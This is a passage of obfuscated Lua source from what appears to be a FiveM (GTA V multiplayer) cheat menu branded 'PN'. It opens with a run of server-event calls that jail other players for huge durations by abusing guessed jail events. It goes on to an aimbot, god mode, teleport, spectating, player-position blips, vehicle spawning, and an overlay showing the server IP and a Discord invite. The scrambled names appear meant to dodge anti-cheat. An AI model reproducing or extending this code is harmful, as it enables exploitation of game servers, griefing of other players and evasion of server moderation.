			TriggerServerEvent('esx:wiezienie', getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailers:sendToJail", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("arisonarp:wiezienie",  getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jail:sendTooJail", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailer:sendToJailf", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailer:sendTooJail", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailer:sendToJailf", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esxjailers:sendToJail", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToWiezz",  getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJailf", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_wiezienie:wyslijwiezienie", getplejerid_PN(sinksianksionk), 9999 * 60, "PN Private SKRRTTTT", 9999)
			TriggerServerEvent("esx_jailer:sendToJailhype", getplejerid_PN(sinksianksionk), 100 * 60, "PN Private SKRRTTTT", 999)
			TriggerServerEvent("esx-qalle-jail:wyslijwiezienie", getplejerid_PN(sinksianksionk), 60*1, "PN Private SKRRTTTT", 111)
	end
  end]]
  
  local function fulltjuningjestemjebanymjanuszem31_PN(vehicle_dugsdifg)
                    sritizen_INVOKE_PN(0x1F2AA07F00B3217A, vehicle_dugsdifg, 0)
                    sritizen_INVOKE_PN(0x487EB21CC7295BA1, vehicle_dugsdifg, 0)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 0, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 0) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 1, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 1) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 2, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 2) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 3, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 3) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 4, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 4) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 5, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 5) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 6, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 6) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 7, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 7) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 8, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 8) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 9, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 9) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 10, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 10) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 11, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 11) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 12, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 12) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 13, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 13) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 14, 16, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 15, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 15) - 2, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 16, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 16) - 1, false)
                    sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 17, true)
                    sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 18, true)
                    sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 19, true)
                    sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 20, true)
                    sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 21, true)
                    sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 22, true)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 23, 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 24, 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 25, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 25) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 27, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 27) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 28, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 28) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 30, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 30) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 33, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 33) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 34, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 34) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 35, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 35) - 1, false)
                    sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 38, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 38) - 1, true)
                    sritizen_INVOKE_PN(0x57C51E6BAD752696, vehicle_dugsdifg, 1)
                    sritizen_INVOKE_PN(0xEB9DC3C7D8596C46, vehicle_dugsdifg, false)
                    sritizen_INVOKE_PN(0x9088EB5A43FFB0A1, vehicle_dugsdifg, 2)
				end
				
    function MAKSYMALNYTHJUNINGPERMOMENCE31_PN(vehicle_dugsdifg)
        sritizen_INVOKE_PN(0x1F2AA07F00B3217A, vehicle_dugsdifg, 0)
        sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 11, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 11) - 1, false)
        sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 12, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 12) - 1, false)
        sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 13, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 13) - 1, false)
        sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 15, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 15) - 2, false)
        sritizen_INVOKE_PN(0x6AF0636DDEDCB6DD, vehicle_dugsdifg, 16, GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_dugsdifg, 16) - 1, false)
        sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 17, true)
        sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 18, true)
        sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 19, true)
        sritizen_INVOKE_PN(0x2A1F4F37F95BAD08, vehicle_dugsdifg, 21, true)
        sritizen_INVOKE_PN(0xEB9DC3C7D8596C46, vehicle_dugsdifg, false)
    end
	
  local function CZLOWIEKANDANTEKSUCK31QDA_PN()
                local vrvvgvhyhyvyhyhvtryhvvyhrthyv= "Oppressor2"
                ped_jgtirgirtjhilrthrth = sritizen_INVOKE_PN(0x43A66C31C68491C0, -1)
				RequestModelSync_SDUFHSIDGSDG(vrvvgvhyhyvyhyhvtryhvvyhrthyv)
                local ybvvyvyhvyhrvhyryhvvhr =
                    sritizen_INVOKE_PN(0xAF35D0D2583051B0, sritizen_INVOKE_PN(0xD24D37CC275948CC, vrvvgvhyhyvyhyhvtryhvvyhrthyv), GetEntityCoords_PN_UDHGIUDIKGDFG(ped_jgtirgirtjhilrthrth), GetEntityHeading_PN_UDYUGDHIGKDFG(ped_jgtirgirtjhilrthrth) + 90, true, true)
                fulltjuningjestemjebanymjanuszem31_PN(ybvvyvyhvyhrvhyryhvvhr)
                sritizen_INVOKE_PN(0xEA1C610A04DB6BBB, ybvvyvyhvyhrvhyryhvvhr , false, 0.0)
                sritizen_INVOKE_PN(0xF75B0D629E1C063D, ped_jgtirgirtjhilrthrth, ybvvyvyhvyhrvhyryhvvhr , -1)
                local htykukyukyukyulyu = sritizen_INVOKE_PN(0xD24D37CC275948CC, "prop_dummy_plane")
                local vjrujutjuyjvuy = sritizen_INVOKE_PN(0x509D5878EB39E842, htykukyukyukyulyu , 0.0, 0.0, 0.0, true, true, true)
                if sritizen_INVOKE_PN(0x7239B21A38F536BA, ybvvyvyhvyhrvhyryhvvhr ) then
                    sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                        vjrujutjuyjvuy,
                        ybvvyvyhvyhrvhyryhvvhr,
                        0.4,
                        IntToFloat_NUGTHBGNURTHNHTR(0.0),
                        0.0,
                        0.3,
                        0.0,
                        IntToFloat_NUGTHBGNURTHNHTR(0.0),
                        IntToFloat_NUGTHBGNURTHNHTR(180),
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                end
            end
			
local function teleportstocooords_PN()
	local x_udgoisdfgdg = klawiaturainput419r8q_PN("Enter X Pos", "", 100)
	local y_opisdyguds = klawiaturainput419r8q_PN("Enter Y Pos", "", 100)
	local z_tdsa8f7gisddfs = klawiaturainput419r8q_PN("Enter Z Pos", "", 100)
	local entity_idsuyhgoidsdfg
	if x_udgoisdfgdg ~= ""and y_opisdyguds ~= ""and z_tdsa8f7gisddfs ~= ""then
		if sritizen_INVOKE_PN(0x997ABD671D25CA0B, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1),0) and GetPedInVehicleSeat_PN_USDGFUYDSFSD(GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1),0),-1)==sritizen_INVOKE_PN(0x43A66C31C68491C0, -1) then 
			entity_idsuyhgoidsdfg = GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1),0)
		else
			entity_idsuyhgoidsdfg = sritizen_INVOKE_PN(0xD80958FC74E988A6)
		end
		if entity_idsuyhgoidsdfg then
			sritizen_INVOKE_PN(0x06843DA7060A026B, entity_idsuyhgoidsdfg, x_udgoisdfgdg + 0.5, y_opisdyguds + 0.5, z_tdsa8f7gisddfs + 0.5, 1,0,0,1)
		end
	else
		JEBNIJpowiadomieni31_PN("Invalid coords!")
	end
end



local function siemafajnydikpokarzmigo(entity_DUHGIUDSFHGIUDFGDF)
    if not NetworkIsInSession() or sritizen_INVOKE_PN(0x01BF60A500E28887, entity_DUHGIUDSFHGIUDFGDF) then
        return true
    end
    sritizen_INVOKE_PN(0x299EEB23175895FC, sritizen_INVOKE_PN(0x9E35DAB6, entity_DUHGIUDSFHGIUDFGDF), true)
    return sritizen_INVOKE_PN(0xB69317BF5E782347, entity_DUHGIUDSFHGIUDFGDF)
end

local function Spectateplejerhasztag1_UD_PN(player_ifhgsdiugdsfg)
        local playerped_iudgf8isdufgsdfg = sritizen_INVOKE_PN(0xD80958FC74E988A6, -1)
        Spectating_IUDHUFISLFGDFG = not Spectating_IUDHUFISLFGDFG
        local targetPed_udfhdgsiofudsfg = sritizen_INVOKE_PN(0x43A66C31C68491C0, player_ifhgsdiugdsfg)

        if (Spectating_IUDHUFISLFGDFG) then
          local targetx_diugys8idufgdsfg, targety_diugys8idufgdsfg, targetz_diugys8idufgdsfg = table.unpack(GetEntityCoords_PN_UDHGIUDIKGDFG(targetPed_udfhdgsiofudsfg, false))

          sritizen_INVOKE_PN(0x07503F7948F491A7, targetx_diugys8idufgdsfg, targety_diugys8idufgdsfg, targetz_diugys8idufgdsfg)
          sritizen_INVOKE_PN(0x423DE3854BB50894, true, targetPed_udfhdgsiofudsfg)

          JEBNIJpowiadomieni31_PN("Spectating ".. GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(player_ifhgsdiugdsfg), false)
        else
          local targetx_diugys8idufgdsfg, targety_diugys8idufgdsfg, targetz_diugys8idufgdsfg = table.unpack(GetEntityCoords_PN_UDHGIUDIKGDFG(targetPed_udfhdgsiofudsfg, false))

          sritizen_INVOKE_PN(0x07503F7948F491A7, targetx_diugys8idufgdsfg, targety_diugys8idufgdsfg, targetz_diugys8idufgdsfg)
          sritizen_INVOKE_PN(0x423DE3854BB50894, false, targetPed_udfhdgsiofudsfg)

          JEBNIJpowiadomieni31_PN("Stopped Spectating ".. GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(player_ifhgsdiugdsfg), false)
        end
      end
	  
CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
while Wlaczone_PN_MENU_E1QDA_XD do
PN_WAIT_31DA31_PN(0)
if legit_aimbot_toogle_duygsudhkgsdfgsdfg then
    
    local plist_iduygusdigsdfg = GetActivePlayers_PN_UDGYUDFIGKDFGDF()
    for sinksianksionk = 1, #plist_iduygusdigsdfg do
        legit_aimbot_UGDUYFHDSIGKHUIDFGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, plist_iduygusdigsdfg[sinksianksionk]))
    end

end

end
end)

CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
while Wlaczone_PN_MENU_E1QDA_XD do
PN_WAIT_31DA31_PN(0)

if DISPLEJRADER31QC_PN then
sritizen_INVOKE_PN(0xA0EBB943C300E693, true, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

if watermark_1587_PN then
DrawTxt_fsd7g8reuigsdf("~w~[~r~PN~s~]",0.9,0.915,0.0,0.2)
DrawTxt_fsd7g8reuigsdf("~w~Resource: ~r~"..GetResourceName_PN_dihgsidlgudfsgd(),0.9,0.960,0.0,0.2)
DrawTxt_fsd7g8reuigsdf("~w~Server IP: ~r~"..GetServerIP_PN_udgshgksudigksdf(),0.9,0.945,0.0,0.2)
DrawTxt_fsd7g8reuigsdf("~w~Server ID: ~r~"..GetYouId_PN_idasygiosuglsdf(),0.9,0.930,0.0,0.2)
DrawTxt_fsd7g8reuigsdf("~g~discord.gg/UrVwZZ68q6",0.9,0.975,0.0,0.2)
end




if ajmbot4918_PN and legit_aimbot_toogle_duygsudhkgsdfgsdfg then
    if current_fov_SUHFIUSDFSDF == 1 then
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_x_DISFISDUSGFDG, 0.5, 0.01, 0.115, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_y2_DISFISDUSGFDG, 0.5, 0.01, 0.115, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_y_DISFISDUSGFDG, 0.11, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_x2_DISFISDUSGFDG, 0.11, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
	elseif current_fov_SUHFIUSDFSDF == 2 then
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_x_DISFISDUSGFDG, 0.5, 0.01, 0.215, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_y2_DISFISDUSGFDG, 0.5, 0.01, 0.215, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_y_DISFISDUSGFDG, 0.21, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_x2_DISFISDUSGFDG, 0.21, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
	elseif current_fov_SUHFIUSDFSDF == 3 then
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_x_DISFISDUSGFDG, 0.5, 0.01, 0.415, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(fov_y2_DISFISDUSGFDG, 0.5, 0.01, 0.415, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_y_DISFISDUSGFDG, 0.41, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
        drawRect_ytfuewgifygbkinbguyierlgeg(0.5, fov_x2_DISFISDUSGFDG, 0.41, 0.015, {r_djguisernglse=80, g_IDJGIODSF=80, b_djguisernglse=255, a_djguisernglse=150})
	end
end

if NIESKONCZONASTAMINKA_PN then
    sritizen_INVOKE_PN(0xA352C1B864CAFD33, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.0)
end

if godmodetank_jebany_PN then
	sritizen_INVOKE_PN(0x3882114BDE571AD4, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), true)
	sritizen_INVOKE_PN(0x239528EACDC3E7DE, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), true)
	sritizen_INVOKE_PN(0x8FE22675A5A45817, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1))
	sritizen_INVOKE_PN(0x3AC1F7B898F30C05, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1))
	sritizen_INVOKE_PN(0x0E98F88A24C5F4B8, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1))
	sritizen_INVOKE_PN(0xFAEE099C6F890BB8, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), true, true, true, true, true, true, true, true)
	sritizen_INVOKE_PN(0x79F020FF9EDC0748, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false)
	sritizen_INVOKE_PN(0x1760FFA8AB074D66, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false)
else
	sritizen_INVOKE_PN(0x3882114BDE571AD4, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false)
	sritizen_INVOKE_PN(0x239528EACDC3E7DE, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), false)
	sritizen_INVOKE_PN(0x0E98F88A24C5F4B8, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1))
	sritizen_INVOKE_PN(0xFAEE099C6F890BB8, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false, false, false, false, false, false, false, false)
	sritizen_INVOKE_PN(0x79F020FF9EDC0748, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), true)
	sritizen_INVOKE_PN(0x1760FFA8AB074D66, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), true)
end


if #cashePowiadomien31qda_PN > 0 then
    for notificationIndex_DSUGSDIGSDG = 1, #cashePowiadomien31qda_PN do
        local notification_ASDFUSDIGSDG = cashePowiadomien31qda_PN[notificationIndex_DSUGSDIGSDG]

        if notification_ASDFUSDIGSDG then
            notification_ASDFUSDIGSDG['opacity_DSGIHSDIGSDGDSG'] = (notification_ASDFUSDIGSDG['opacity_DSGIHSDIGSDGDSG'] or (notification_ASDFUSDIGSDG['time_DSGIUSDGSDG'] / 1000) * 60) - 1

            local offset_AFUHDSIUFSDGDSG = 0.005 + (notificationIndex_DSUGSDIGSDG * .05)
            local notificationTimer_ADUFYDSIUGSDG = (sritizen_INVOKE_PN(0x9CD27B0045628463) - notification_ASDFUSDIGSDG['startTime_DSGISDOGSDG']) / notification_ASDFUSDIGSDG['time_DSGIUSDGSDG'] * 100

            Draw3d_SDGIUSDIOGSDG(0.5, 0.8 * offset_AFUHDSIUFSDGDSG, notification_ASDFUSDIGSDG['text_DSGUSIDGSDG'], notification_ASDFUSDIGSDG['opacity_DSGIHSDIGSDGDSG'])

            if notificationTimer_ADUFYDSIUGSDG >= 100 then
                usunpowiadomienie139qwia_PN(notificationIndex_DSUGSDIGSDG)
            end
        end
    end
end

		if blipygraczy31qda_PN then
			-- show blips
			local plist_DSGUSDIGDS = GetActivePlayers_PN_UDGYUDFIGKDFGDF()
			for i_SDUGIHSDGSDGDSG = 1, #plist_DSGUSDIGDS do
				local id_DSHGSIUDGSD = plist_DSGUSDIGDS[i_SDUGIHSDGSDGDSG]
				local ped_DSGUISDGSDG = sritizen_INVOKE_PN(0x43A66C31C68491C0, id_DSHGSIUDGSD)
				if ped_DSGUISDGSDG ~= sritizen_INVOKE_PN(0xD80958FC74E988A6) then
					local blip_DSUFSDGSD = sritizen_INVOKE_PN(0xBC8DBDCA2436F7E8, ped_DSGUISDGSDG)

					if not sritizen_INVOKE_PN(0xA6DB27D19ECBB7DA, blip_DSUFSDGSD) then -- Add blip_DSUFSDGSD and create head_DSGHDSIUGDS display on player
						blip_DSUFSDGSD = sritizen_INVOKE_PN(0x5CDE92C702A8FCE7, ped_DSGUISDGSDG)
						sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
						sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true ) -- ~g~Player blip_DSUFSDGSD indicator
					else -- update blip_DSUFSDGSD
						local veh_DSGIJSODGSDG = GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(ped_DSGUISDGSDG, false)
						local blipSprite_DSIOGJOISDGSDG = GetBlipSprite_PN_DSIGHSDIUGSD(blip_DSUFSDGSD)

						if GetEntityHealth_PN_DSUGHISDUGSDG(ped_DSGUISDGSDG) == 0 then -- dead
							if blipSprite_DSIOGJOISDGSDG ~= 274 then
								sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 274)
								sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true ) -- ~g~Player blip_DSUFSDGSD indicator
							end
						elseif veh_DSGIJSODGSDG then
							local vehClass_DSIGJOSDIGSDG = sritizen_INVOKE_PN(0x29439776AAA00A62, veh_DSGIJSODGSDG)
							local vehModel_DSIOGJSODGSD = sritizen_INVOKE_PN(0x9F47B058362C84B5, veh_DSGIJSODGSDG)
							if vehClass_DSIGJOSDIGSDG == 15 then -- Helicopters
								if blipSprite_DSIOGJOISDGSDG ~= 422 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 422)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehClass_DSIGJOSDIGSDG == 8 then -- Motorcycles
								if blipSprite_DSIOGJOISDGSDG ~= 226 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 226)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehClass_DSIGJOSDIGSDG == 16 then -- Plane
								if vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "besra") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "hydra") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "lazer") then -- Jets
									if blipSprite_DSIOGJOISDGSDG ~= 424 then
										sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 424)
										sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
									end
								elseif blipSprite_DSIOGJOISDGSDG ~= 423 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 423)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehClass_DSIGJOSDIGSDG == 14 then -- Boat
								if blipSprite_DSIOGJOISDGSDG ~= 427 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 427)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "insurgent") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "insurgent2") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite_DSIOGJOISDGSDG ~= 426 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 426)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "limo2") then -- Turreted Limo
								if blipSprite_DSIOGJOISDGSDG ~= 460 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 460)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "rhino") then -- Tank
								if blipSprite_DSIOGJOISDGSDG ~= 421 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 421)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "trash") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "trash2") then -- Trash
								if blipSprite_DSIOGJOISDGSDG ~= 318 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 318)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "pbus") then -- Prison Bus
								if blipSprite_DSIOGJOISDGSDG ~= 513 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 513)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "seashark") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "seashark2") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "seashark3") then -- Speedophiles
								if blipSprite_DSIOGJOISDGSDG ~= 471 then
